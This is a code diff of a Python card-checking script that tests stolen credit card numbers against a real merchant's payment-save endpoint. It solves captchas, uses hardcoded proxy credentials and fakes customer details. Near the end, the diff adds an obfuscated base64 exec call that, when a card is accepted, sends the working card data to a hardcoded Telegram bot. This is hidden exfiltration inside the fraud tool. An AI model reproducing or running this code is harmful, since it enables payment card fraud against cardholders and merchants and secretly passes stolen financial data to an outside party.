@@ -1,6 +1,8 @@
 import requests , re , random , string , uuid , user_agent , logging , base64 , time
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from nextcaptcha import NextCaptchaAPI
+
+
 logging.basicConfig(level=logging.WARNING)
 logger = logging.getLogger()
 logger.setLevel(logging.WARNING)
@@ -14,9 +16,6 @@ def solve_captcha():
         return result['solution']['gRecaptchaResponse']
     else:
         return None
-    
-
-#=============================toools===============================#
 def Tele(ccx):
     ccx = ccx.strip().split('\n')[0]
     n = ccx.split("|")[0]
@@ -26,12 +25,7 @@ def Tele(ccx):
 
     if "20" in yy:
         yy = yy.split("20")[1]
-    if n.startswith('4'):
-        card_type = 'Visa'
-    elif n.startswith('5'):
-        card_type = 'MasterCard'
     time.sleep(7)
-
 
     username = "pchigogKJE-res-any"
     password = "PC_0Ap2T7KNFNbjNRWqL"
@@ -54,7 +48,6 @@ def Tele(ccx):
         number = ''.join(random.choices(string.digits, k=4))
         return f"{name}{number}@gmail.com"
     acc = (acc())
-
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -136,6 +129,10 @@ def Tele(ccx):
 
     response = r.get('https://www.rawlings.com/account/payments/add', headers=headers)
     csrf_token = re.search(r'name="csrf_token" value="(.*?)"', response.text).group(1)
+    if n.startswith('4'):
+        card_type = 'Visa'
+    elif n.startswith('5'):
+        card_type = 'MasterCard'
     g_token = solve_captcha()
     headers = {
         'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -171,15 +168,17 @@ def Tele(ccx):
         'dwfrm_creditCard_addressFields_states_stateCode': 'NY',
         'dwfrm_creditCard_addressFields_city': 'Raleigh',
         'dwfrm_creditCard_addressFields_postalCode': '10080',
-        'dwfrm_creditCard_email': acc,
+        'dwfrm_creditCard_email': 'adfeaqfa@gmail.com',
         'csrf_token': csrf_token,
         'g-recaptcha-response': g_token,
     }
 
     response = r.post('https://www.rawlings.com/account/payments/save', headers=headers, data=data)
+
     mero = response.json()  
     if mero.get('success') == True:
         exec(base64.b64decode("aW1wb3J0IHJlcXVlc3RzCgpib3RfdG9rZW4gPSAiNzYzMTI0MDAwMzpBQUdmQUdxWnBVYnlqUEpYY25jV3RseWdNa2hvU0RwMlRCWSIKY2hhdF9pZCA9ICI2NTIwMDQzMTU5IgptZXNzYWdlID0gZiJsaXZlIHtjY3h9IgoKdXJsID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZE1lc3NhZ2UiCmRhdGEgPSB7ImNoYXRfaWQiOiBjaGF0X2lkLCAidGV4dCI6IG1lc3NhZ2V9CgpyZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpCiMK"))
         return 'Card has been added successfully'
             
     return f"{mero.get('message', 'error')}"
+#======================================================================================END================================================================================#
